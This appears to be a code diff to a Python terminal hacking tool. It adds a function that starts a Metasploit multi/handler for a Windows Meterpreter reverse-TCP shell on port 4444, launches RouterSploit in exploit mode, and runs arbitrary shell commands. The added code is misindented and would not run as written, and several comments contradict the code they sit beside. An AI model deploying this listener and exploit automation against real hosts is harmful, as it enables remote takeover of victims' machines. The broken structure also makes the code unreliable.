@@ -81,7 +81,7 @@ def show_main_menu_logo():
         print(Fore.RED + line)  # Blue for even lines  
       else:  
         print(Fore.LIGHTRED_EX + line)  # White for odd lines  
-      time.sleep(0.3)  # Medium delay (0.3 seconds per line)  
+      time.sleep(0.1)  # Medium delay (0.3 seconds per line)  
   
 # Function to run a scan with a given command  
 def run_scan(command, ip=None):  
@@ -702,6 +702,51 @@ def main_menu():
         exiting_loading_screen()  
       else:  
         print(Fore.RED + "Invalid choice. Please try again.")  
+      def run_scan(command, ip=None):  
+       global exit_program, scanning_in_progress  
+   scanning_in_progress = True  
+   try:  
+      # Display the fast loading screen  
+      fast_loading_screen()  
+      # Launch Metasploit with the port 4444  
+      metasploit_command = f"msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport 4444; exploit -j\""  
+      subprocess.Popen(metasploit_command, shell=True)  
   
+      # Launch RouterSploit with the port 4444  
+      routersploit_command = f"python routersploit.py -c \"exploit\" -p 4444"  
+      subprocess.Popen(routersploit_command, shell=True)  
+      # Check if the command is not empty or None  
+      if command:  
+        print(Fore.LIGHTCYAN_EX + f"Running command: {command}")  
+        # Run the scan in a subprocess  
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  
+        stdout, stderr = process.communicate()  
+        if stderr:  
+           print(Fore.RED + "Error during scan:", stderr.decode())  
+        else:  
+           output = stdout.decode()  
+           print(Fore.BLUE + "Scan Completed Successfully.")  
+           print(output)  
+           # Save the packet data to a file  
+           save_results = input(Fore.YELLOW + "Would you like to save the results of the scan and the IP? (yes/no): ").strip().lower()  
+           if save_results == "yes":  
+              file_name = input(Fore.LIGHTWHITE_EX + "Enter a file name to save results (e.g., results.txt): ").strip()  
+              with open(file_name, "a") as file:  
+                file.write(f"IP: {ip}\n{output}\n\n")  
+              print(Fore.LIGHTGREEN_EX + f"Results saved to '{file_name}'.")  
+           elif save_results == "no":  
+              print(Fore.WHITE + "Returning to the main menu...")  
+           else:  
+              print(Fore.RED + "Invalid choice, returning to the main menu.")  
+           # Add a prompt to ensure the user sees the output  
+           input(Fore.LIGHTRED_EX + "\nPress Enter to return to the main menu...")  
+      else:  
+        print(Fore.RED + "Error: Invalid command!")  
+   except subprocess.CalledProcessError as e:  
+      print(f"Error running scan: {e}")  
+   finally:  
+      scanning_in_progress = False  
+      # Clear the screen after the scan if user presses Enter  
+      clear_screen()  
 if __name__ == "__main__":  
    main_menu()
